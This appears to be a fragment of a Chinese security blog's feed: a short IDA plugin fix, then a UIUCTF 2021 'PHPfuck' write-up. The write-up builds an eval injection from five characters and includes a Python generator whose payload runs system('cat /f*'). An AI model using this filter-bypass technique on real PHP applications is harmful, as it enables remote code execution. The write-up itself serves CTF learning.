    <content type="html"><![CDATA[<p>额,之前一直被<code>could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!</code>这个报错恶心了很久,今天无意间终于找到了解决(补救方案)。<a id="more"></a></p><h2 id="报错状况描述"><a href="#报错状况描述" class="headerlink" title="报错状况描述"></a>报错状况描述</h2><p>在报错后，出现 <code>.plt.sec</code> 的segement。libc的symbols能被ida正常解析，但是并未被ida自动连接绑定上。本该解析libc symbols的地方，显示的是<code>.plt.sec</code>的值， 如图：</p><p><img src="image-20210916112022149.png" alt="image-20210916112022149"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>添加插件：pltresolver</p><p>项目地址：<a href="https://github.com/veritas501/pltresolver" target="_blank" rel="noopener">https://github.com/veritas501/pltresolver</a></p><p>在ida项目中的<code>plugins</code>倒入脚本：</p><p><img src="image-20210916113633798.png" alt="image-20210916113633798"></p><p>打开ida看到<code>pltResolver plugin has been loaded.Press Ctrl+Shift+J to resolve .plt.sec symbols.</code>即为倒入成功！</p><p><img src="image-20210916113730185.png" alt="image-20210916113730185"></p><h2 id="修复后效果"><a href="#修复后效果" class="headerlink" title="修复后效果"></a>修复后效果</h2><p>看到ida 把libc sysmbols用重新识别上了： </p><p><img src="image-20210916113420325.png" alt="image-20210916113420325"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;额,之前一直被&lt;code&gt;could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!&lt;/code&gt;这个报错恶心了很久,今天无意间终于找到了解决(补救方案)。</summary>
    
    
    
    <category term="tools" scheme="lexsd6.github.io/categories/tools/"/>
    
    
    <category term="ida" scheme="lexsd6.github.io/tags/ida/"/>
    
    <category term="problem_resolve" scheme="lexsd6.github.io/tags/problem-resolve/"/>
    
  </entry>
  
  <entry>
    <title>5种字符&#39;(^.9)&#39;构造php_shellcode</title>
    <link href="lexsd6.github.io/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/"/>
    <id>lexsd6.github.io/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/</id>
    <published>2021-09-03T01:50:00.222Z</published>
    <updated>2021-09-15T06:57:37.259Z</updated>
    
    <content type="html"><![CDATA[<p>2021_uiuctf中出了一道jali题PHPfuck,题目要求用5种字符构造出php shellcode,感觉很有意思便记录下来。<a id="more"></a></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>这道题给的很洁净，就是下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Flag is inside ./flag.php :)</span></span><br><span class="line">($x=str_replace(<span class="string">"`"</span>,<span class="string">""</span>,strval($_REQUEST[<span class="string">"x"</span>])))&amp;&amp;strlen(count_chars($x,<span class="number">3</span>))&lt;=<span class="number">5</span>?<span class="keyword">print</span>(<span class="keyword">eval</span>(<span class="string">"return $x;"</span>)):show_source(<span class="keyword">__FILE__</span>)&amp;&amp;phpinfo();</span><br></pre></td></tr></table></figure><p>（当然在比赛结束后，官方也分享了环境<a href="https://github.com/sigpwny/UIUCTF-2021-Public/tree/master/jail/phpfuck）" target="_blank" rel="noopener">https://github.com/sigpwny/UIUCTF-2021-Public/tree/master/jail/phpfuck）</a></p><p>题目通过了<code>strlen(count_chars($x,3))&lt;=5</code>限制我们最多用5个字符。</p><p>这五个字符，一度困扰了我很久，因为我一开始想到的是<code>(^.&#39;)</code>。。。。。。</p><h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 id="双标的"><a href="#双标的" class="headerlink" title="双标的."></a>双标的<code>.</code></h3><p>在php中，<code>.</code>号又对于两个字符串间有连接的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'le'</span>.<span class="string">'xsd6'</span>) <span class="comment">#string(6) "lexsd6"</span></span><br></pre></td></tr></table></figure><p>对两个数字间的<code>.</code>号，php会将他们看作是小数关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(1.2) #float(1.2)</span><br></pre></td></tr></table></figure><p>但，如把<code>.</code>号附近的数字用括号括起来php会把他们进行字符串般的对待</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump((<span class="number">1</span>));<span class="comment">#int(1)</span></span><br><span class="line">var_dump((<span class="number">2</span>));<span class="comment">#int(2)</span></span><br><span class="line">var_dump((<span class="number">1</span>).(<span class="number">2</span>));<span class="comment">#string(2) "12"</span></span><br></pre></td></tr></table></figure><p>同时由于php对于大于309长度的数字转化为<code>INF</code>,<code>INF</code>与<code>(9)</code>同连接符号<code>.</code>得到string  <code>&quot;INF9&quot;</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>);</span><br><span class="line"><span class="comment"># float(INF)</span></span><br><span class="line">var_dump((<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>).(<span class="number">9</span>));</span><br><span class="line"><span class="comment"># string(4) "INF9"</span></span><br></pre></td></tr></table></figure><h3 id="奇怪的"><a href="#奇怪的" class="headerlink" title="奇怪的^"></a>奇怪的<code>^</code></h3><p>由于php变量的特性。在进行<code>^</code>操作时，其结果也有些微妙变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'9'</span>^(<span class="number">1</span>)); <span class="comment">#int(8)</span></span><br><span class="line">var_dump(<span class="string">'9'</span>^<span class="string">'1'</span>);<span class="comment">#string(1) ""</span></span><br><span class="line">var_dump(<span class="string">'9'</span>^<span class="number">1</span>)<span class="comment">#;int(8)</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">var_dump(<span class="string">'99'</span>^(<span class="number">1</span>));<span class="comment">#int(98)</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="string">'1'</span>);<span class="comment">#string(1) ""</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="number">1</span>);<span class="comment">#int(98)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'99'</span>^(<span class="number">11</span>));<span class="comment">#int(104)</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="string">'11'</span>);<span class="comment">#string(2) ""</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="number">11</span>);<span class="comment">#int(104)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'c'</span>^<span class="number">11</span>);<span class="comment">#int(11)</span></span><br><span class="line">var_dump(<span class="string">'c'</span>^<span class="string">'11'</span>);<span class="comment">#string(1) "R"</span></span><br><span class="line">var_dump(<span class="string">'c'</span>^(<span class="number">11</span>));<span class="comment">#int(11)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'cc'</span>^<span class="number">11</span>);<span class="comment">#int(11)</span></span><br><span class="line">var_dump(<span class="string">'cc'</span>^<span class="string">'11'</span>);<span class="comment">#string(2) "RR"</span></span><br><span class="line">var_dump(<span class="string">'cc'</span>^(<span class="number">11</span>));<span class="comment">#int(11)</span></span><br></pre></td></tr></table></figure><p>可以上看到几点：</p><ol><li>数字字符串（string型数字，如上：’99’.’9’）在与int数字进行<code>^</code>操作时，会把两者都视为int数字来进行操作。所以<code>&#39;9&#39;^(1)</code>实际上是<code>9^1</code>而不是<code>&#39;\x39&#39;^1</code>.</li><li>两不同字符串相<code>^</code>时，结果字符串长度跟原字符串两者中最小字符串长度的字符相等。(例:<code>&#39;c&#39;^&#39;11&#39; == &quot;R&quot;</code>)</li><li>字符字符串与int数字相与时，结果为原来int数字</li></ol><h3 id="小数四舍五入"><a href="#小数四舍五入" class="headerlink" title="小数四舍五入"></a>小数四舍五入</h3><p>在php中会把<code>.99</code>自动看成是小数<code>0.99</code>。</p><p>同当一个浮点数的小数位大于<code>.99999999999999999995</code>时，会自动变成进一位。小于会丢弃最后一位：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">.999999999999994</span>);<span class="comment">#float(0.99999999999999)</span></span><br><span class="line">var_dump(<span class="number">.999999999999995</span>);<span class="comment">#float(1)</span></span><br><span class="line">var_dump(<span class="number">.999999999999999</span>);<span class="comment">#float(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="number">3.99999999999994</span>);<span class="comment">#float(3.9999999999999)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999995</span>);<span class="comment">#float(3.9999999999999)</span></span><br><span class="line">var_dump(<span class="number">3.999999999999955</span>);<span class="comment">#float(4)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999996</span>);<span class="comment">#float(4)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999999</span>);<span class="comment">#float(4)</span></span><br></pre></td></tr></table></figure><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><h3 id="构造任意数字"><a href="#构造任意数字" class="headerlink" title="构造任意数字"></a>构造任意数字</h3><p>由于上面的特性,我们可以用<code>9(^).</code>这个字符简单的构造些数字如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'106'</span>:<span class="string">'(99^9)'</span>,</span><br><span class="line"><span class="string">'99'</span>:<span class="string">'(99)'</span>,</span><br><span class="line"><span class="string">'19'</span>:<span class="string">'(((.99999999999999999999).(9))^(9)^(9))'</span>,</span><br><span class="line"><span class="string">'7'</span>:<span class="string">'(99.999999999999999999^99)'</span>,</span><br><span class="line"><span class="string">'3'</span>:<span class="string">'(9.9999999999999999999^9)'</span>,</span><br><span class="line"><span class="string">'1'</span>:<span class="string">'(.99999999999999999999)'</span>,</span><br><span class="line"><span class="string">'0'</span>:<span class="string">'(9^9)'</span>,</span><br><span class="line"><span class="string">'9'</span>:<span class="string">'(9)'</span>,</span><br></pre></td></tr></table></figure><p>我们再让这些数字相互<code>^</code>进而得到所有的单字符数字(<code>0-9</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#39;1&#39;: &#39;(.99999999999999999999)&#39;, </span><br><span class="line">&#39;0&#39;: &#39;(9^9)&#39;, </span><br><span class="line">3&#39;: &#39;(9.9999999999999999999^9)&#39;, </span><br><span class="line">&#39;2&#39;: &#39;((9.9999999999999999999^9)^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;5&#39;:&#39;(((99.999999999999999999^99)^(9.9999999999999999999^9))^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;4&#39;: &#39;((99.999999999999999999^99)^(9.9999999999999999999^9))&#39;,</span><br><span class="line">&#39;7&#39;: &#39;(99.999999999999999999^99)&#39;,</span><br><span class="line">&#39;6&#39;: &#39;((99.999999999999999999^99)^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;9&#39;: &#39;(9)&#39;, </span><br><span class="line">&#39;8&#39;: &#39;((9)^(.99999999999999999999))&#39;&#125;</span><br></pre></td></tr></table></figure><h3 id="通过可变函数构造任意字符"><a href="#通过可变函数构造任意字符" class="headerlink" title="通过可变函数构造任意字符"></a>通过可变函数构造任意字符</h3><h4 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h4><p>在php高版本中我们可以通过字符串+<code>(变量)</code>的方式来调用函数.例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'phpinfo'</span>)()<span class="comment">#phpinfo()</span></span><br><span class="line">(<span class="string">'syStem'</span>)(<span class="string">'ls'</span>)<span class="comment">#system('ls')</span></span><br></pre></td></tr></table></figure><p>同时，由于php函数名是不区分大小的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr() ==CHr()</span><br><span class="line"><span class="string">'cHr'</span>()=chr()</span><br></pre></td></tr></table></figure><p>我们只要构造出<code>C/c</code>、<code>H/h</code>、<code>R/r</code>就可以调用<code>chr</code>从而构造任意字符。</p><h4 id="构造chr"><a href="#构造chr" class="headerlink" title="构造chr"></a>构造chr</h4><p>我们可以通过<code>&#39;INF9&#39;</code>,构造出不分大小写的<code>chr</code>.</p><p>经过test后发现:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;I&#39;^&#39;3&#39;^&#39;9&#39; &#x3D;&#x3D;&#39;C&#39;</span><br><span class="line">&#39;N&#39;^&#39;1&#39;^&#39;7&#39;&#x3D;&#39;H&#39;</span><br><span class="line">&#39;F&#39;^&#39;4&#39; &#x3D;&#x3D;&#39;r&#39;</span><br></pre></td></tr></table></figure><p>于是我们可以让：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(‘INF‘.(<span class="number">9</span>))^(<span class="string">'314'</span>)^(<span class="string">'97\X00X00'</span>)==<span class="string">'CHr'</span>;</span><br><span class="line"><span class="comment">#即</span></span><br><span class="line"><span class="string">'CHr'</span>==((((<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>).(<span class="number">9</span>))^((<span class="number">9.9999999999999999999</span>^<span class="number">9</span>).(<span class="number">.99999999999999999999</span>).((<span class="number">99.999999999999999999</span>^<span class="number">99</span>)^(<span class="number">9.9999999999999999999</span>^<span class="number">9</span>))))^((<span class="number">9</span>).(<span class="number">99.999999999999999999</span>^<span class="number">99</span>).(((<span class="number">9</span>).(<span class="number">9</span>))^((<span class="number">9</span>).(<span class="number">9</span>)))));</span><br></pre></td></tr></table></figure><h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">def init():</span><br><span class="line">    num=&#123;</span><br><span class="line">        <span class="string">'106'</span>:<span class="string">'(99^9)'</span>,</span><br><span class="line">        <span class="string">'99'</span>:<span class="string">'(99)'</span>,</span><br><span class="line">        <span class="string">'19'</span>:<span class="string">'(((.99999999999999999999).(9))^(9)^(9))'</span>,</span><br><span class="line">        <span class="string">'7'</span>:<span class="string">'(99.999999999999999999^99)'</span>,</span><br><span class="line">        <span class="string">'3'</span>:<span class="string">'(9.9999999999999999999^9)'</span>,</span><br><span class="line">        <span class="string">'1'</span>:<span class="string">'(.99999999999999999999)'</span>,</span><br><span class="line">        <span class="string">'0'</span>:<span class="string">'(9^9)'</span>,</span><br><span class="line">        <span class="string">'9'</span>:<span class="string">'(9)'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> y in range(<span class="number">3</span>):</span><br><span class="line">        key=num.keys()</span><br><span class="line">        <span class="keyword">for</span> i in range(len(key)):</span><br><span class="line">            <span class="keyword">for</span> x  in range(len(key)):</span><br><span class="line">                k=(int(key[x])^int(key[i]))</span><br><span class="line">                <span class="keyword">if</span> num.has_key(str(k))== <span class="keyword">False</span>:</span><br><span class="line">                    num[str(k)]=<span class="string">'('</span>+num[key[x]]+<span class="string">'^'</span>+num[key[i]]+<span class="string">')'</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">def one_num(num):</span><br><span class="line">    onum=&#123;&#125;</span><br><span class="line">    key=num.keys()</span><br><span class="line">    <span class="keyword">for</span> i in range(len(key)):</span><br><span class="line">        <span class="keyword">if</span> len(key[i])==<span class="number">1</span>:</span><br><span class="line">            onum[(key[i])]=num[key[i]]</span><br><span class="line">    <span class="keyword">return</span> onum</span><br><span class="line">def get_null(long=<span class="number">1</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">null</span>=<span class="string">'11'</span></span><br><span class="line"></span><br><span class="line">def chrstr(I,N,F):</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    I=I.split(<span class="string">'^'</span>)</span><br><span class="line">    N=N.split(<span class="string">'^'</span>)</span><br><span class="line">    F=F.split(<span class="string">'^'</span>)</span><br><span class="line">    MAX_num=max(len(I),len(N),len(F))</span><br><span class="line">    num=int_num</span><br><span class="line">    num[<span class="string">'null'</span>]=<span class="string">'(((9).(9))^((9).(9)))'</span></span><br><span class="line">    ret=<span class="string">'((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))'</span></span><br><span class="line">    <span class="comment">#print(I,N,F)</span></span><br><span class="line">    <span class="keyword">if</span> len(F)&lt;MAX_num:</span><br><span class="line">        </span><br><span class="line">            F.append(<span class="string">'null'</span>)</span><br><span class="line">    <span class="keyword">for</span> i in range(MAX_num):</span><br><span class="line">        ret=<span class="string">'('</span>+ret+<span class="string">"^("</span>+int_num[I[i]]+<span class="string">"."</span>+int_num[N[i]]+<span class="string">"."</span>+int_num[F[i]]+<span class="string">"))"</span></span><br><span class="line">    <span class="comment">#print(ret)</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    <span class="comment">#print(result)</span></span><br><span class="line">def guess_chr():</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    num=int_num</span><br><span class="line">    I_test=&#123;&#125;</span><br><span class="line">    N_test=&#123;&#125;</span><br><span class="line">    F_test=&#123;&#125;</span><br><span class="line">    want=<span class="string">'chr'</span></span><br><span class="line">    want=want.upper()</span><br><span class="line">    num_int=num.keys()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x in num_int:</span><br><span class="line">        <span class="keyword">for</span> y in num_int:</span><br><span class="line">                k=(chr(ord(<span class="string">'I'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> I_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     I_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">                k=(chr(ord(<span class="string">'N'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> N_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     N_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">                k=(chr(ord(<span class="string">'F'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> F_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     F_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">    <span class="keyword">for</span> x in num_int:</span><br><span class="line">       </span><br><span class="line">                k=(chr(ord(<span class="string">'I'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> I_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                    I_test[k.upper()]=(x)</span><br><span class="line">                k=(chr(ord(<span class="string">'N'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> N_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                    N_test[k.upper()]=(x)</span><br><span class="line">                k=(chr(ord(<span class="string">'F'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> F_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     F_test[k.upper()]=(x)</span><br><span class="line">    <span class="keyword">if</span> I_test.has_key(want[<span class="number">0</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'I not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line">   </span><br><span class="line">           </span><br><span class="line">    <span class="keyword">if</span> N_test.has_key(want[<span class="number">1</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'N not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> F_test.has_key(want[<span class="number">2</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'F not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(F_test)</span></span><br><span class="line">    <span class="keyword">return</span> chrstr(I_test[want[<span class="number">0</span>]],N_test[want[<span class="number">1</span>]],F_test[want[<span class="number">2</span>]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def guess(want):</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    want=str(ord(want))</span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i in want:</span><br><span class="line">        ret+=int_num[i]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret[:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def shell(fun,code):<span class="comment">#有参数函数</span></span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    sym=[<span class="string">'('</span>,<span class="string">'^'</span>,<span class="string">'.'</span>,<span class="string">')'</span>]</span><br><span class="line">    <span class="keyword">global</span> chr_str</span><br><span class="line">    <span class="keyword">for</span> i in fun:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(i)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line">    ret=<span class="string">"("</span>+ret[:<span class="number">-1</span>]+<span class="string">')(('</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x in code:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(x)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    ret=ret[:<span class="number">-1</span>]+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">def code(xx):<span class="comment">#无差数函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x in xx:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(x)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    ret=ret[:<span class="number">-1</span>]+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    num=init()</span><br><span class="line">    int_num=one_num(num)</span><br><span class="line">    chr_str=guess_chr()</span><br><span class="line">    x=(shell(<span class="string">'assert'</span>,<span class="string">'system("cat /f*")'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>(x)</span><br><span class="line">    <span class="keyword">print</span>(len(x))</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>勉强完成出解题的脚本，但是一直在思考一个问题.在高版本php中,assert和eval是不可作为可变函数的,那么还有没有什么方法来进行代码执行.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021_uiuctf中出了一道jali题PHPfuck,题目要求用5种字符构造出php shellcode,感觉很有意思便记录下来。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="php" scheme="lexsd6.github.io/tags/php/"/>
    
    <category term="web" scheme="lexsd6.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ractf2021-pwn-ctf</title>
    <link href="lexsd6.github.io/2021/08/17/ractf2021-pwn-ctf/"/>
    <id>lexsd6.github.io/2021/08/17/ractf2021-pwn-ctf/</id>
    <published>2021-08-17T15:07:16.917Z</published>
    <updated>2021-08-17T16:21:36.003Z</updated>
    
